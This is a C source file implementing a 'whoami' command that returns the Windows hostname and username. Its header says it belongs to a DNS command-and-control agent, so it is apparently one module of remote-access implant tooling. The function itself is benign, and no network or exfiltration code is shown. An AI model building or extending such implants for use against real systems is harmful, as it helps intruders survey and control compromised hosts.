/**
 * whoami.c - Print current user command for DNS C2 Agent
 */

 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include "../include/whoami.h"
 #include "../include/Utils.h"
 
 /**
  * Print the current user
  */
 char* cmd_whoami(const char* args) {
     (void)args; // Suppress unused parameter warning
     
     // Use Unicode-aware functions
     char* username = get_username();
     if (username == NULL) {
         return _strdup("Error: Could not get username");
     }
     
     char* hostname = get_hostname();
     if (hostname == NULL) {
         free(username);
         return _strdup("Error: Could not get hostname");
     }
     
     char* result = (char*)malloc(strlen(username) + strlen(hostname) + 32);
     if (result != NULL) {
         sprintf_s(result, strlen(username) + strlen(hostname) + 32, "%s\\%s", hostname, username);
     }
     
     free(username);
     free(hostname);
     return result;
 }
 